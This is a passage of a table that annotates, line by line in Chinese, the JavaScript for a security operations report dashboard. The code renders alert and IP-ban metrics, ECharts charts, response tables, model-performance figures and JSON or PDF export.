| 136 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setText(el.coverModel, (s.model_performance && s.model_performance.version) \|\| "v1");` |
| 137 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setText(el.coverScore, s.overview && s.overview.security_score);` |
| 138 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 139 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 140 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderOverview(o) {` |
| 141 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const m = el.overviewGrid;` |
| 142 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!m) return;` |
| 143 | DOM 查询：定位页面元素以便读取或更新。 | `    setText(m.querySelector('[data-metric="total_alerts"]'), fmtInt(o.total_alerts));` |
| 144 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setText(` |
| 145 | DOM 查询：定位页面元素以便读取或更新。 | `      m.querySelector('[data-metric="critical_high"]'),` |
| 146 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      fmtInt((o.critical_alerts \|\| 0) + (o.high_alerts \|\| 0))` |
| 147 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 148 | DOM 查询：定位页面元素以便读取或更新。 | `    setText(m.querySelector('[data-metric="open_alerts"]'), fmtInt(o.open_alerts));` |
| 149 | DOM 查询：定位页面元素以便读取或更新。 | `    setText(m.querySelector('[data-metric="resolved_alerts"]'), fmtInt(o.resolved_alerts));` |
| 150 | DOM 查询：定位页面元素以便读取或更新。 | `    setText(m.querySelector('[data-metric="banned_ips"]'), fmtInt(o.banned_ips));` |
| 151 | DOM 查询：定位页面元素以便读取或更新。 | `    setText(m.querySelector('[data-metric="iocs_total"]'), fmtInt(o.iocs_total));` |
| 152 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setText(` |
| 153 | DOM 查询：定位页面元素以便读取或更新。 | `      m.querySelector('[data-metric="rules_ratio"]'),` |
| 154 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      \`${fmtInt(o.rules_enabled)} / ${fmtInt(o.rules_total)}\`` |
| 155 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 156 | DOM 查询：定位页面元素以便读取或更新。 | `    setText(m.querySelector('[data-metric="security_score"]'), fmtInt(o.security_score));` |
| 157 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 158 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 159 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderThreats(t) {` |
| 160 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderLevelChart(t.by_level \|\| []);` |
| 161 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderTypeChart(t.by_type \|\| []);` |
| 162 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderTimelineChart(t.timeline \|\| []);` |
| 163 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderTopSources(t.top_sources \|\| []);` |
| 164 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 165 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 166 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function reportChartTheme() {` |
| 167 | 返回结果：把计算值交给调用方。 | `    return {` |
| 168 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      textStyle: {` |
| 169 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        fontFamily: "Inter, system-ui, sans-serif",` |
| 170 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        color: "#111827",` |
| 171 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 172 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      title: { textStyle: { color: "#111827" } },` |
| 173 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 174 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 175 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 176 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function ensureChart(id, node) {` |
| 177 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.charts[id]) {` |
| 178 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.charts[id].dispose();` |
| 179 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 180 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    state.charts[id] = echarts.init(node, null, { renderer: "canvas" });` |
| 181 | 返回结果：把计算值交给调用方。 | `    return state.charts[id];` |
| 182 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 183 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 184 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderLevelChart(data) {` |
| 185 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!window.echarts) return;` |
| 186 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const chart = ensureChart("level", el.chartLevel);` |
| 187 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    chart.setOption({` |
| 188 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ...reportChartTheme(),` |
| 189 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      tooltip: { trigger: "item", confine: true },` |
| 190 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      legend: {` |
| 191 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        orient: "vertical",` |
| 192 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        left: "right",` |
| 193 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        top: "middle",` |
| 194 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        textStyle: { color: "#4B5563", fontSize: 12 },` |
| 195 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 196 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      series: [` |
| 197 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        {` |
| 198 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          type: "pie",` |
| 199 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          radius: ["50%", "72%"],` |
| 200 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          center: ["35%", "50%"],` |
| 201 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          avoidLabelOverlap: true,` |
| 202 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          label: { show: false },` |
| 203 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `          data: data.map((d) => ({` |
| 204 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            name: d.level.toUpperCase(),` |
| 205 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            value: d.count,` |
| 206 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            itemStyle: { color: LEVEL_COLOR[d.level] \|\| "#9CA3AF" },` |
| 207 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          })),` |
| 208 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 209 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ],` |
| 210 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 211 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 212 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 213 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderTypeChart(data) {` |
| 214 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!window.echarts) return;` |
| 215 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const chart = ensureChart("type", el.chartType);` |
| 216 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const categories = data.map((d) => d.type);` |
| 217 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const values = data.map((d) => d.count);` |
| 218 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    chart.setOption({` |
| 219 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ...reportChartTheme(),` |
| 220 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      grid: { left: 100, right: 20, top: 10, bottom: 20 },` |
| 221 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      tooltip: { trigger: "axis", axisPointer: { type: "shadow" } },` |
| 222 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      xAxis: {` |
| 223 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        type: "value",` |
| 224 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLine: { lineStyle: { color: "#E5E7EB" } },` |
| 225 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        splitLine: { lineStyle: { color: "#F3F4F6" } },` |
| 226 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLabel: { color: "#6B7280" },` |
| 227 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 228 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      yAxis: {` |
| 229 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        type: "category",` |
| 230 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        data: categories,` |
| 231 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        inverse: true,` |
| 232 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLine: { lineStyle: { color: "#E5E7EB" } },` |
| 233 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLabel: { color: "#4B5563", fontSize: 12 },` |
| 234 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 235 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      series: [` |
| 236 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        {` |
| 237 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          type: "bar",` |
| 238 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          data: values,` |
| 239 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          barMaxWidth: 14,` |
| 240 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          itemStyle: { color: "#10B981", borderRadius: [0, 3, 3, 0] },` |
| 241 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          label: { show: true, position: "right", color: "#111827", fontSize: 11 },` |
| 242 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 243 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ],` |
| 244 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 245 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 246 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 247 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderTimelineChart(buckets) {` |
| 248 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!window.echarts) return;` |
| 249 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const chart = ensureChart("timeline", el.chartTimeline);` |
| 250 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const xs = buckets.map((b) => formatTime(b.start).slice(5));` |
| 251 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const ys = buckets.map((b) => b.count);` |
| 252 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    chart.setOption({` |
| 253 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ...reportChartTheme(),` |
| 254 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      grid: { left: 40, right: 20, top: 20, bottom: 40 },` |
| 255 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      tooltip: { trigger: "axis" },` |
| 256 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      xAxis: {` |
| 257 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        type: "category",` |
| 258 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        data: xs,` |
| 259 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLine: { lineStyle: { color: "#E5E7EB" } },` |
| 260 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLabel: { color: "#6B7280", fontSize: 11 },` |
| 261 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 262 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      yAxis: {` |
| 263 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        type: "value",` |
| 264 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLine: { lineStyle: { color: "#E5E7EB" } },` |
| 265 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        splitLine: { lineStyle: { color: "#F3F4F6" } },` |
| 266 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLabel: { color: "#6B7280" },` |
| 267 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 268 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      series: [` |
| 269 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        {` |
| 270 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          type: "line",` |
| 271 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          data: ys,` |
| 272 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          smooth: true,` |
| 273 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          showSymbol: false,` |
| 274 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          lineStyle: { color: "#10B981", width: 2 },` |
| 275 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          areaStyle: { color: "rgba(16,185,129,0.12)" },` |
| 276 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 277 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ],` |
| 278 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 279 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 280 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 281 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderTopSources(rows) {` |
| 282 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!rows.length) {` |
| 283 | 页面更新：修改元素内容、样式或状态。 | `      el.tableTopSources.innerHTML =` |
| 284 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<tr><td colspan="3" class="text-tertiary" style="text-align: center">本周期无可归因来源</td></tr>';` |
| 285 | 返回结果：把计算值交给调用方。 | `      return;` |
| 286 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 287 | 页面更新：修改元素内容、样式或状态。 | `    el.tableTopSources.innerHTML = rows` |
| 288 | 遍历处理：逐项渲染或转换数据。 | `      .map(` |
| 289 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        (r, i) => \`` |
| 290 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        <tr>` |
| 291 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          <td>${i + 1}</td>` |
| 292 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          <td><code class="mono">${escapeHtml(r.ip)}</code></td>` |
| 293 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          <td>${fmtInt(r.count)}</td>` |
| 294 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        </tr>\`` |
| 295 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      )` |
| 296 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .join("");` |
| 297 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 298 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 299 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderResponses(rows) {` |
| 300 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!rows.length) {` |
| 301 | 页面更新：修改元素内容、样式或状态。 | `      el.tableResponses.innerHTML =` |
| 302 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<tr><td colspan="5" class="text-tertiary" style="text-align: center">本周期无处置动作</td></tr>';` |
| 303 | 返回结果：把计算值交给调用方。 | `      return;` |
| 304 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 305 | 页面更新：修改元素内容、样式或状态。 | `    el.tableResponses.innerHTML = rows` |
| 306 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      .map((r) => {` |
| 307 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const actLabel = ACTION_LABEL[r.action] \|\| r.action \|\| "—";` |
| 308 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const title = r.alert_title` |
| 309 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          ? \`${escapeHtml(r.alert_title)}（${escapeHtml(r.reason \|\| "")}）\`` |
| 310 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          : escapeHtml(r.reason \|\| "—");` |
| 311 | 返回结果：把计算值交给调用方。 | `        return \`` |
| 312 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          <tr>` |
| 313 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            <td class="mono" style="font-size: 12px; color: #6B7280">${escapeHtml(` |
| 314 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              formatTime(r.timestamp)` |
| 315 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            )}</td>` |
| 316 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            <td>${escapeHtml(actLabel)}</td>` |
| 317 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            <td><code class="mono">${escapeHtml(r.target \|\| "—")}</code></td>` |
| 318 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            <td>${title}</td>` |
| 319 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            <td style="color: #6B7280">${escapeHtml(r.operator \|\| "—")}</td>` |
| 320 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          </tr>\`;` |
| 321 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      })` |
| 322 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .join("");` |
| 323 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 324 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 325 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderModelPerf(m) {` |
| 326 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const grid = document.querySelector("#section-model .report-overview");` |
| 327 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!grid) return;` |
| 328 | DOM 查询：定位页面元素以便读取或更新。 | `    setText(grid.querySelector('[data-model="version"]'), m.version);` |
| 329 | DOM 查询：定位页面元素以便读取或更新。 | `    setText(grid.querySelector('[data-model="total_checked"]'), fmtInt(m.total_checked));` |
| 330 | DOM 查询：定位页面元素以便读取或更新。 | `    setText(grid.querySelector('[data-model="avg_confidence"]'), (m.avg_confidence ?? 0).toFixed(2));` |
| 331 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setText(` |
| 332 | DOM 查询：定位页面元素以便读取或更新。 | `      grid.querySelector('[data-model="high_confidence_ratio"]'),` |
| 333 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      fmtPercent(m.high_confidence_ratio)` |
| 334 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 335 | DOM 查询：定位页面元素以便读取或更新。 | `    setText(grid.querySelector('[data-model="detection_rate"]'), fmtPercent(m.detection_rate));` |
| 336 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setText(` |
| 337 | DOM 查询：定位页面元素以便读取或更新。 | `      grid.querySelector('[data-model="mean_resolution"]'),` |
| 338 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      fmtDuration(m.mean_resolution_latency_sec)` |
| 339 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 340 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 341 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!window.echarts) return;` |
| 342 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const chart = ensureChart("conf", el.chartConfidence);` |
| 343 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const dist = m.confidence_distribution \|\| [];` |
| 344 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    chart.setOption({` |
| 345 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ...reportChartTheme(),` |
| 346 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      grid: { left: 60, right: 20, top: 20, bottom: 30 },` |
| 347 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      tooltip: { trigger: "axis", axisPointer: { type: "shadow" } },` |
| 348 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      xAxis: {` |
| 349 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        type: "category",` |
| 350 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        data: dist.map((d) => d.range),` |
| 351 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLine: { lineStyle: { color: "#E5E7EB" } },` |
| 352 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLabel: { color: "#6B7280" },` |
| 353 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 354 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      yAxis: {` |
| 355 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        type: "value",` |
| 356 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLine: { lineStyle: { color: "#E5E7EB" } },` |
| 357 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        splitLine: { lineStyle: { color: "#F3F4F6" } },` |
| 358 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        axisLabel: { color: "#6B7280" },` |
| 359 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      },` |
| 360 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      series: [` |
| 361 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        {` |
| 362 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          type: "bar",` |
| 363 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `          data: dist.map((d) => d.count),` |
| 364 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          barMaxWidth: 28,` |
| 365 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          itemStyle: { color: "#60A5FA", borderRadius: [4, 4, 0, 0] },` |
| 366 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          label: { show: true, position: "top", color: "#111827", fontSize: 11 },` |
| 367 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 368 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ],` |
| 369 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 370 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 371 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 372 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderRecommendations(items) {` |
| 373 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!items.length) {` |
| 374 | 页面更新：修改元素内容、样式或状态。 | `      el.recommendations.innerHTML = "";` |
| 375 | 返回结果：把计算值交给调用方。 | `      return;` |
| 376 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 377 | 页面更新：修改元素内容、样式或状态。 | `    el.recommendations.innerHTML = items` |
| 378 | 遍历处理：逐项渲染或转换数据。 | `      .map(` |
| 379 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        (r) => \`` |
| 380 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        <li class="report-recommendations__item report-recommendations__item--${escapeHtml(r.severity \|\| "info")}">` |
| 381 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          <h3 class="report-recommendations__title">${escapeHtml(r.title \|\| "—")}</h3>` |
| 382 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          <p class="report-recommendations__body">${escapeHtml(r.body \|\| "")}</p>` |
| 383 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        </li>\`` |
| 384 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      )` |
| 385 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .join("");` |
| 386 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 387 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 388 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 389 | 注释：说明前端逻辑或交互意图。 | `   * 交互：周期切换 / 刷新 / 导出` |
| 390 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 391 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindHandlers() {` |
| 392 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnPeriods.forEach((btn) => {` |
| 393 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      btn.addEventListener("click", () => {` |
| 394 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.period = btn.dataset.period;` |
| 395 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        el.btnPeriods.forEach((b) =>` |
| 396 | 页面更新：修改元素内容、样式或状态。 | `          b.classList.toggle("is-active", b === btn)` |
| 397 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        );` |
| 398 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        loadSummary();` |
| 399 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 400 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 401 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 402 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.btnRefresh.addEventListener("click", loadSummary);` |
| 403 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 404 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnExportJson.addEventListener("click", () => {` |
| 405 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!state.summary) return;` |
| 406 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const blob = new Blob([JSON.stringify(state.summary, null, 2)], {` |
| 407 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        type: "application/json",` |
| 408 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 409 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      triggerDownload(blob, \`report-${state.period}-${stampNow()}.json\`);` |
| 410 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 411 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 412 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.btnExportHtml.addEventListener("click", exportHtmlSnapshot);` |
| 413 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnExportPdf.addEventListener("click", () => {` |
| 414 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast("即将唤起打印窗口；选择「另存为 PDF」即可", "info");` |
| 415 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      setTimeout(() => window.print(), 300);` |
| 416 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 417 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 418 | 注释：说明前端逻辑或交互意图。 | `    // 窗口尺寸变化时 ECharts 跟随` |
| 419 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    window.addEventListener("resize", () => {` |
| 420 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      Object.values(state.charts).forEach((c) => c && c.resize());` |
| 421 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 422 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 423 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 424 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function stampNow() {` |
| 425 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const d = new Date();` |
| 426 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const pad = (n) => String(n).padStart(2, "0");` |
| 427 | 返回结果：把计算值交给调用方。 | `    return (` |
| 428 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      d.getFullYear().toString() +` |
| 429 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pad(d.getMonth() + 1) +` |
| 430 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pad(d.getDate()) +` |
| 431 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "-" +` |
| 432 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pad(d.getHours()) +` |
| 433 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pad(d.getMinutes())` |
| 434 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 435 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 436 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 437 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function triggerDownload(blob, filename) {` |
| 438 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const url = URL.createObjectURL(blob);` |
| 439 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const a = document.createElement("a");` |
| 440 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    a.href = url;` |
| 441 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    a.download = filename;` |
| 442 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    document.body.appendChild(a);` |
| 443 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    a.click();` |
| 444 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    setTimeout(() => {` |
| 445 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      document.body.removeChild(a);` |
| 446 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      URL.revokeObjectURL(url);` |
| 447 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }, 0);` |
| 448 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 449 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 450 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function exportHtmlSnapshot() {` |
